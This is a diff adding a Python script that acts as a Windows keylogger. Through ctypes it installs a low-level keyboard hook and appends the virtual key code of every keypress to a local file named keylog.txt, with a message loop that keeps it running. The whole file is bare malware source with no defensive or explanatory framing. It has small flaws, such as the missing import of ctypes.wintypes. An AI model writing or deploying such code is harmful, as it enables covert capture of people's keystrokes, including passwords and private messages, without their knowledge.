@@ -1,0 +1,43 @@
+import ctypes
+import time
+
+# Windows API constants
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN = 0x0100
+
+# Windows structures
+class KBDLLHOOKSTRUCT(ctypes.Structure):
+    _fields_ = [("vkCode", ctypes.c_uint),
+                ("scanCode", ctypes.c_uint),
+                ("flags", ctypes.c_uint),
+                ("time", ctypes.c_uint),
+                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]
+
+user32 = ctypes.windll.user32
+kernel32 = ctypes.windll.kernel32
+
+# Log file
+log_file = "keylog.txt"
+
+def low_level_keyboard_proc(nCode, wParam, lParam):
+    if wParam == WM_KEYDOWN:
+        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+        with open(log_file, "a") as f:
+            f.write(f"{kb.vkCode} ")  # Writes virtual key code
+    return user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_int, ctypes.c_void_p)
+pointer = CMPFUNC(low_level_keyboard_proc)
+
+hook_id = user32.SetWindowsHookExA(
+    WH_KEYBOARD_LL,
+    pointer,
+    kernel32.GetModuleHandleW(None),
+    0
+)
+
+# Message loop to keep the program running
+msg = ctypes.wintypes.MSG()
+while user32.GetMessageA(ctypes.byref(msg), 0, 0, 0) != 0:
+    user32.TranslateMessage(ctypes.byref(msg))
+    user32.DispatchMessageA(ctypes.byref(msg))
